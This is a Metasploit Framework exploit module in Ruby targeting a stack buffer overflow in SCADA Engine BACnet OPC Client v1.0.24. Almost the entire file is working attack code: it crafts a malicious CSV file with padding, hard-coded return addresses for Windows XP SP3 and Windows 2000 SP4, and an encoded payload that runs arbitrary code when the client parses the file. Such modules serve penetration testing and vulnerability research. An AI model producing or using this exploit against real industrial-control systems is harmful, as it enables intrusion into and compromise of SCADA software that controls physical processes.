##
# $Id: bacnet_csv.rb 11039 2010-11-14 19:03:24Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'BACnet OPC Client Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in SCADA
				Engine BACnet OPC Client v1.0.24. When the BACnet OPC Client
				parses a specially crafted csv file, arbitrary code may be
				executed.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'Jeremy Brown', 'MC' ],
			'Version'        => '$Revision: 11039 $',
			'References'     =>
				[
					[ 'OSVDB', '68096'],
					[ 'BID', '43289' ],
					[ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICSA-10-264-01.pdf' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'MinNops'  => 0,
					'MaxNops'  => 0,
					'Space'    => 698,
					'BadChars' =>  Rex::Text.charset_exclude(Rex::Text::AlphaNumeric),
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ECX',
						},
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3 English',   { 'Ret' => 0x77e26323 } ],
					[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Sep 16 2010',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new( 'FILENAME',  [ false, 'The file name.',  'msf.csv' ]),
			], self.class)

	end

	def exploit

		csv = "OPC_TAG_NAME,OBJECT_TYPE,INSTANCE,OBJECT_NAME\n\\"
		csv << rand_text_alpha_upper(185)
		csv << [target.ret].pack('V') + rand_text_alpha_upper(4)
		csv << payload.encoded + rand_text_alpha_upper(750 - payload.encoded.length)
		csv << "\\scada,0,0,\n"

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(csv)

	end

end